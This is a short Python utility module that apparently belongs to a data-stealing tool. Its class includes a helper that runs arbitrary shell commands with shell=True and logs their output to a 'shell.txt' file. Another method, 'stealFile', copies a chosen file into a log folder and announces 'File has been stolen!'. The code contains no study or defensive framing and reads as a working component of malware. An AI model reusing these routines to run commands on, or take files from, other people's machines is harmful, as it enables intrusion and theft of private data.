from subprocess import check_output
from json import loads
from shutil import copy


class Util:
  
    @staticmethod
    def fileOut(file:str, data:str, mode='a') -> None:
        try:
            with open(file=file, mode=mode, encoding='UTF-8') as FILE:
                FILE.write(str(data))
        except Exception:
            print('fileOut Error!')


    @staticmethod
    def jsonIn(file) -> str:
        with open(file=file, mode='r') as FILE:
            return loads(FILE.readlines()[0])



    @staticmethod
    def executeShellCommand(command:str) -> str:
        result = ''
        try:
            result = check_output(command, shell=True, encoding='437')
        except Exception:
            result = 'Shell command execution failed!'
        return result



    @staticmethod
    def extractShellData(logPath, shellCommand:str):
        if shellCommand:
            try:
                result = Util.executeShellCommand(shellCommand)
                Util.fileOut(logPath + 'shell.txt', result, 'w')
                print('Shell command executed!')
            except Exception:
                print('shellcommand error')



    @staticmethod
    def stealFile(logPath, stealPath:str):
        if stealPath:
            try:
                filename = stealPath.split('\\')[-1]
                copy(stealPath, logPath + filename)
                print('File has been stolen!')
            except Exception:
                print('stealFile error!!!')

